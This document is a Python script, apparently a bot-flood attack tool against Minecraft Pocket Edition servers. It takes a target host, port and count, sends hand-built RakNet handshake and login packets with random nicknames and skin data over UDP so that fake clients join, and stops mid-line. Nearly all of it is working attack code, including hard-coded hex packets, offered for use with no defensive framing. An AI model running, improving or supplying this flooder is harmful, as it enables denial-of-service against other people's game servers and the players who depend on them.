# Esse programa foi feito pelo um russo desconhecido
# Esse programa foi feito pelo um russo desconhecido
# Mais TeamTECKED deu melhorada nesse script.
import socket
import threading
import uuid
import time
import random
import sys

#Count

escolher_host = sys.argv[1]

port = int(sys.argv[2])

c = int(sys.argv[3])

#Server ip address
host = f"{escolher_host}"

#IP
ip = socket.gethostbyname(host)
ip_in_bytes = hex(~int(ip.split(".")[0]) & 0xff)[2:]+hex(~int(ip.split(".")[1]) & 0xff)[2:]+hex(~int(ip.split(".")[2]) & 0xff)[2:]+hex(~int(ip.split(".")[3]) & 0xff)[2:]
ip_and_port_in_hex = (ip+":"+str(port)).encode().hex()

#Text colors
class Colors:
	Black = "\033[30m"
	Red = "\033[31m"
	Green = "\033[32m"
	Orange = "\033[33m"
	Blue = "\033[34m"
	Purple = "\033[35m"
	Cyan = "\033[36m"
	LightGrey = "\033[37m"
	DarkGrey = "\033[90m"
	LightRed = "\033[91m"
	LightGreen = "\033[92m"
	Yellow = "\033[93m"
	LightBlue = "\033[94m"
	Pink = "\033[95m"
	LightCyan = "\033[96m"
	Reset = "\033[0m"

def random_line(file):
	line = next(file)
	for num, aline in enumerate(file,2):
		if random.randrange(num):
			continue
		line=aline
	return line

#guid
class guid:
	#guid version 1
	guid1 = str(uuid.uuid1()).lower().split("-")
	#guid version 4
	guid4 = str(uuid.uuid4()).lower().split("-")

#RakNet
class RakNet:
	#OFFLINE_MESSAGE_DATA_ID
	Magic = "00ffff00fefefefefdfdfdfd12345678"
	#OPEN_CONNECTION_REQUEST_1
	Creq1 = "05"+Magic+"07"+"0"*2892
	Creq2 = "07"+Magic+"04"+ip_in_bytes+hex(port)[2:]+"05b8"+"0"*8+guid.guid4[2]+guid.guid4[1]

#Minecraft pe 0.14.0 protocol
class GamePackets:
	Ready = "840100006002f0010000000000001304"+ip_in_bytes+hex(port)[2:]+"0480fffffe4abc04ffffffff000004ffffffff000004ffffffff000004ffffffff000004ffffffff000004ffffffff000004ffffffff000004ffffffff000004ffffffff0000000000000000"

a = {}
k = 0

def test():
	global k
	global clientid
	k+=1
	key = "test"+str(k)
	value = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
	a[key] = value
	#Nickname
	nickname = random_line(open("/home/container/nicknames.txt")).strip().encode().hex()
	a[key].sendto(bytes.fromhex(RakNet.Creq1),(host,port))
	data=a[key].recv(5000)
	if data.find(bytes.fromhex("06"))==0:
		a[key].sendto(bytes.fromhex(RakNet.Creq2),(host,port))
		data=a[key].recv(5000)
	if data.find(bytes.fromhex("08"))==0:
		a[key].sendto(bytes.fromhex("84"+"0"*6+"400090"+"0"*6+"09"+"0"*8+guid.guid4[2]+guid.guid4[1]+"0"*12+guid.guid1[2]+"00"),(host,port))
		data=a[key].recv(5000)
	if data.find(bytes.fromhex("80"))==0:
		id = data[101:]
		a[key].sendto(bytes.fromhex("c0000101000000"),(host,port))
		a[key].sendto(bytes.fromhex(GamePackets.Ready)+id+bytes.fromhex("000000000000"+guid.guid1[2]+"00004800000000000000"+guid.guid1[2]),(host,port))
		a[key].sendto(bytes.fromhex("84020000702be0020000010000000000000c0000000000008e8f00"+hex(int(len(nickname)/2))[2:].zfill(2)+nickname+"0000002d0000002d"+hex(random.randint(1000000000000000000,9999999999999999999))[2:].zfill(16)+str(uuid.uuid4()).replace("-","")+"00"+hex(int(len(ip_and_port_in_hex)/2))[2:].zfill(2)+ip_and_port_in_hex+"0010a23c3c68f2071a14559dc1620a195d6b000e5374616e646173645f5374657665400000000000000000000000000000000000000000000000000000000000000000002a1d0dff2a1d0dff241808ff2a1d0dff2a1d0dff241808ff241808ff1f100bff75472fff75472fff75472fff75472fff75472fff75472fff75472fff75472fff0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002a1d0dff241808ff2f1f0fff2f1f0fff2a1d0dff241808ff241808ff241808ff75472fff6a4030ff865334ff6a4030ff865334ff865334ff75472fff75472fff0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002a1d0dff2f1f0fff2f1f0fff261a0aff2a1d0dff241808ff241808ff241808ff75472fff6a4030ff232323ff232323ff232323ff232323ff6a4030ff75472fff000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000241808ff2f1f0fff2a1d0dff241808ff2a1d0dff2a1d0dff2f1f0fff2a1d0dff75472fff6a4030ff232323ff232323ff232323ff232323ff6a4030ff75472fff0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002a1d0dff2f1f0fff2a1d0dff261a0aff261a0aff2f1f0fff2f1f0fff2a1d0dff75472fff6a4030ff232323ff232323ff232323ff232323ff6a4030ff75472fff00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"),(host,port))
		a[key].sendto(bytes.fromhex("8c030000000048000000000000001b63"),(host,port))
		a[key].sendto(bytes.fromhex("8c040000702ae0030000010000000000000d000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002a1d0dff2a1d0dff261a0aff261a0aff2f1f0fff2f1f0fff2f1f0fff2a1d0dff75472fff6a4030ff232323ff232323ff232323ff232323ff522826ff75472fff0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002a1d0dff261a0aff2f1f0fff291c0cff261a0aff1f100bff2f1f0fff2a1d0dff75472fff6a4030ff6a4030ff6a4030ff6a4030ff6a4030ff6a4030ff75472fff0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002a1d0dff291c0cff261a0aff261a0aff261a0aff261a0aff2a1d0dff2a1d0dff75472fff75472fff75472fff75472fff75472fff75472fff75472fff75472fff00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000281b0aff281b0aff261a0aff271b0bff291c0cff322310ff2d2010ff2d2010ff2f200dff2b1e0dff2f1f0fff281c0bff241808ff261a0aff2b1e0dff2a1d0dff2d2010ff2d2010ff322310ff291c0cff271b0bff261a0aff281b0aff281b0aff2a1d0dff2a1d0dff241808ff2a1d0dff2a1d0dff241808ff241808ff1f100bff0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000281b0aff281b0aff261a0aff261a0aff2c1e0eff291c0cff2b1e0dff332411ff2b1e0dff2b1e0dff2b1e0dff332411ff422a12ff3f2a15ff2c1e0eff281c0bff332411ff2b1e0dff291c0cff2c1e0eff261a0aff261a0aff281b0aff281b0aff2a1d0dff241808ff2f1f0fff2f1f0fff2a1d0dff241808ff241808ff241808ff00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002c1e0eff26180bff261a0aff291c0cff2b1e0eff281b0bff24180aff291c0cff2b1e0dffb6896cffbd8e72ffc69680ffbd8b72ffbd8e74ffac765aff342512ff291c0cff24180aff281b0b"),(host,port))
		a[key].sendto(bytes.fromhex("8c050000702ae0040000010000000000000d000000000002ff2b1e0eff291c0cff261a0aff26180bff2c1e0eff2a1d0dff2f1f0fff2f1f0fff261a0aff2a1d0dff241808ff241808ff241808ff0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000281b0aff281a0dff2d1d0eff2c1e0eff281b0aff271b0bff2c1e0eff2f2211ffaa7d66ffb4846dffaa7d66ffad806dff9c725cffbb8972ff9c694cff9c694cff2f2211ff2c1e0eff271b0bff281b0aff2c1e0eff2d1d0eff281a0dff281b0aff241808ff2f1f0fff2a1d0dff241808ff2a1d0dff2a1d0dff2f1f0fff2a1d0dff0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000281b0aff281b0aff281b0aff261a0cff231709ff87583aff9c6345ff3a2814ffb4846dffffffffff523d89ffb57b67ffbb8972ff523d89ffffffffffaa7d66ff3a2814ff9c6345ff87583aff231709ff261a0cff281b0aff281b0aff281b0aff2a1d0dff2f1f0fff2a1d0dff261a0aff261a0aff2f1f0fff2f1f0fff2a1d0dff0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000281b0aff281b0aff281a0dff26180bff2c1e11ff845231ff965f41ff885a39ff9c6346ffb37b62ffb78272ff6a4030ff6a4030ffbe886cffa26a47ff805334ff885a39ff965f41ff845231ff2c1e11ff26180bff281a0dff281b0aff281b0aff2a1d0dff2a1d0dff261a0aff261a0aff2f1f0fff2f1f0fff2f1f0fff2a1d0dff00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002c1e0eff281b0aff2d1d0eff62432fff9d6a4fff9a6344ff865334ff75472fff905e43ff965f40ff774235ff774235ff774235ff774235ff8f5e3eff815339ff75472fff865334ff9a6344ff9d6a4fff62432fff2d1d0eff281b0aff2c1e0eff2a1d0dff261a0aff2f1f0fff291c0cff261a0aff1f100bff2f1f0fff2a1d0dff0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000865334ff865334ff9a6344ff865334ff9c6748ff965f41ff8a593bff74482fff6f452cff6d432aff815339ff815339ff7a4e33ff83553bff83553bff7a4e33ff74482fff8a593bff9f6849ff9c6748ff9a644aff9c6748ff9a6344ff865334ff865334ff75472fff261a0aff261a0aff261a0aff261a0aff75472fff865334ff000000000000000000000000000000000000000000000000000000000000000000000000000000"),(host,port))
		a[key].sendto(bytes.fromhex("8c060000702ae0050000010000000000000d0000000000030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005649ccff5649ccff5649ccff5649ccff282828ff282828ff282828ff282828ff000000000000000000000000000000000000000000000000000000000000000000ccccff75472fff75472fff75472fff75472fff75472fff75472fff00ccccff006060ff006060ff006060ff006060ff006060ff006060ff006060ff006060ff000000000000000000000000000000000000000000000000000000000000000000a8a8ff00ccccff00ccccff00a8a8ff6a4030ff513125ff6a4030ff513125ff000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005649ccff5649ccff5649ccff5649ccff282828ff282828ff282828ff282828ff000000000000000000000000000000000000000000000000000000000000000000ccccff6a4030ff6a4030ff6a4030ff6a4030ff6a4030ff6a4030ff00ccccff006060ff006060ff006060ff006060ff006060ff006060ff006060ff006060ff000000000000000000000000000000000000000000000000000000000000000000ccccff00ccccff00ccccff00ccccff6a4030ff513125ff6a4030ff513125ff000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005649ccff5649ccff5649ccff5649ccff282828ff282828ff282828ff282828ff000000000000000000000000000000000000000000000000000000000000000000ccccff6a4030ff6a4030ff6a4030ff6a4030ff6a4030ff6a4030ff00ccccff006060ff006060ff006060ff006060ff006060ff006060ff006060ff006060ff000000000000000000000000000000000000000000000000000000000000000000ccccff00ccccff00ccccff00a8a8ff513125ff6a4030ff513125ff6a4030ff000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005649ccff5649ccff5649ccff5649ccff282828ff282828ff282828ff282828ff000000000000000000000000000000000000000000000000000000000000000000ccccff75472fff75472fff75472fff75472fff75472fff75472fff00ccccff006060ff006060ff006060ff006060ff006060ff006060ff006060ff006060ff000000000000000000000000000000000000000000000000000000000000000000a8a8ff00ccccff00ccccff00a8a8ff513125ff6a4030ff513125ff6a4030ff000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000302872ff302872ff26215bff302872ff463aa5ff463aa5ff463aa5ff463aa5ff302872ff26215bff302872ff302872ff463aa5ff463aa5ff463aa5ff3a3189ff007f7fff007f7fff007f7fff005b5bff009999ff009e9eff815339ffa26a47ff815339ff815339ff009e9eff009e9eff007f7fff007f7fff007f7fff007f7fff009e9eff00a8a8ff00a8a8ff00a8a8ff00afafff00afafff00a8a8ff00a8a8ff007f7fff007f7fff007f7fff007f7fff009e9eff00a8a8ff00afafff00a8a8ff007f7fff007f7fff007f7fff007f7fff00afafff00afafff00afafff00afafff0000000000000000000000000000000000000000000000000000000000000000302872"),(host,port))
		a[key].sendto(bytes.fromhex("8c060000702ae0050000010000000000000d0000000000030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005649ccff5649ccff5649ccff5649ccff282828ff282828ff282828ff282828ff000000000000000000000000000000000000000000000000000000000000000000ccccff75472fff75472fff75472fff75472fff75472fff75472fff00ccccff006060ff006060ff006060ff006060ff006060ff006060ff006060ff006060ff000000000000000000000000000000000000000000000000000000000000000000a8a8ff00ccccff00ccccff00a8a8ff6a4030ff513125ff6a4030ff513125ff000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005649ccff5649ccff5649ccff5649ccff282828ff282828ff282828ff282828ff000000000000000000000000000000000000000000000000000000000000000000ccccff6a4030ff6a4030ff6a4030ff6a4030ff6a4030ff6a4030ff00ccccff006060ff006060ff006060ff006060ff006060ff006060ff006060ff006060ff000000000000000000000000000000000000000000000000000000000000000000ccccff00ccccff00ccccff00ccccff6a4030ff513125ff6a4030ff513125ff000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005649ccff5649ccff5649ccff5649ccff282828ff282828ff282828ff282828ff000000000000000000000000000000000000000000000000000000000000000000ccccff6a4030ff6a4030ff6a4030ff6a4030ff6a4030ff6a4030ff00ccccff006060ff006060ff006060ff006060ff006060ff006060ff006060ff006060ff000000000000000000000000000000000000000000000000000000000000000000ccccff00ccccff00ccccff00a8a8ff513125ff6a4030ff513125ff6a4030ff000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005649ccff5649ccff5649ccff5649ccff282828ff282828ff282828ff282828ff000000000000000000000000000000000000000000000000000000000000000000ccccff75472fff75472fff75472fff75472fff75472fff75472fff00ccccff006060ff006060ff006060ff006060ff006060ff006060ff006060ff006060ff000000000000000000000000000000000000000000000000000000000000000000a8a8ff00ccccff00ccccff00a8a8ff513125ff6a4030ff513125ff6a4030ff000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000302872ff302872ff26215bff302872ff463aa5ff463aa5ff463aa5ff463aa5ff302872ff26215bff302872ff302872ff463aa5ff463aa5ff463aa5ff3a3189ff007f7fff007f7fff007f7fff005b5bff009999ff009e9eff815339ffa26a47ff815339ff815339ff009e9eff009e9eff007f7fff007f7fff007f7fff007f7fff009e9eff00a8a8ff00a8a8ff00a8a8ff00afafff00afafff00a8a8ff00a8a8ff007f7fff007f7fff007f7fff007f7fff009e9eff00a8a8ff00afafff00a8a8ff007f7fff007f7fff007f7fff007f7fff00afafff00afafff00afafff00afafff0000000000000000000000000000000000000000000000000000000000000000302872"),(host,port))
		a[key].sendto(bytes.fromhex("8c070000702ae0060000010000000000000d000000000004ff26215bff26215bff302872ff463aa5ff463aa5ff463aa5ff463aa5ff302872ff26215bff302872ff302872ff463aa5ff463aa5ff463aa5ff463aa5ff007f7fff006868ff006868ff007f7fff00a8a8ff00a8a8ff009e9eff815339ff815339ff009e9eff00afafff00afafff007f7fff006868ff006868ff006868ff00a8a8ff00afafff00afafff00afafff00afafff00afafff00a8a8ff00a8a8ff006868ff006868ff006868ff007f7fff00afafff00a8a8ff00afafff009e9eff007f7fff006868ff006868ff007f7fff00afafff00afafff00afafff00afafff0000000000000000000000000000000000000000000000000000000000000000302872ff26215bff302872ff302872ff463aa5ff463aa5ff463aa5ff463aa5ff302872ff26215bff302872ff302872ff463aa5ff463aa5ff463aa5ff463aa5ff006868ff006868ff006868ff007f7fff00afafff00afafff00a8a8ff009e9eff009999ff00a8a8ff00afafff00afafff006868ff006868ff006868ff006868ff00afafff00afafff00afafff00afafff00afafff00afafff00afafff00a8a8ff007f7fff006868ff006868ff007f7fff00a8a8ff00afafff00afafff00afafff007f7fff006868ff006868ff007f7fff00afafff00afafff00afafff00afafff0000000000000000000000000000000000000000000000000000000000000000302872ff26215bff302872ff302872ff463aa5ff463aa5ff463aa5ff463aa5ff302872ff26215bff302872ff302872ff463aa5ff463aa5ff463aa5ff463aa5ff005b5bff006868ff006868ff005b5bff00afafff00afafff00afafff009e9eff009999ff00afafff00afafff00afafff005b5bff006868ff006868ff005b5bff00afafff00afafff009999ff00afafff00a8a8ff009999ff00afafff00a8a8ff007f7fff006868ff006868ff007f7fff009e9eff00afafff00afafff009e9eff007f7fff006868ff006868ff007f7fff00afafff00afafff00afafff00afafff0000000000000000000000000000000000000000000000000000000000000000302872ff26215bff302872ff302872ff463aa5ff463aa5ff463aa5ff463aa5ff302872ff302872ff26215bff302872ff3a3189ff3a3189ff3a3189ff3a3189ff006868ff005b5bff005b5bff005b5bff009999ff009999ff00afafff00afafff009999ff00afafff009999ff009999ff005b5bff005b5bff005b5bff005b5bff00afafff00a8a8ff009999ff00afafff00a8a8ff009999ff00afafff00afafff965f41ff965f41ff965f41ff87553bffaa7d66ffaa7d66ffaa7d66ffaa7d66ff87553bff965f41ff965f41ff965f41ffaa7d66ffaa7d66ffaa7d66ffaa7d66ff0000000000000000000000000000000000000000000000000000000000000000302872ff26215bff302872ff302872ff463aa5ff3a3189ff3a3189ff463aa5ff302872ff26215bff26215bff302872ff3a3189ff3a3189ff3a3189ff3a3189ff005b5bff005b5bff005b5bff006868ff009999ff009999ff00afafff00a8a8ff009999ff00afafff00a8a8ff009999ff006868ff005b5bff005b5bff006868ff00afafff009999ff009999ff00afafff00a8a8ff009999ff00a8a8ff00afafff965f41ff965f41ff965f41ff87553bffaa7d66ff966f5bffaa7d66ffaa7d66ff965f41ff87553bff965f41ff965f41ffaa7d66ffaa7d66ffaa7d66ffaa7d66ff0000000000000000000000000000000000000000000000000000000000000000302872ff26215bff302872ff302872ff463aa5ff463aa5ff463aa5ff463aa5ff302872ff26215bff302872ff302872ff463aa5ff463aa5ff463aa5ff463aa5ff006868ff005b5bff005b5bff006868ff009999ff00afafff00afafff009999"),(host,port))
		a[key].sendto(bytes.fro
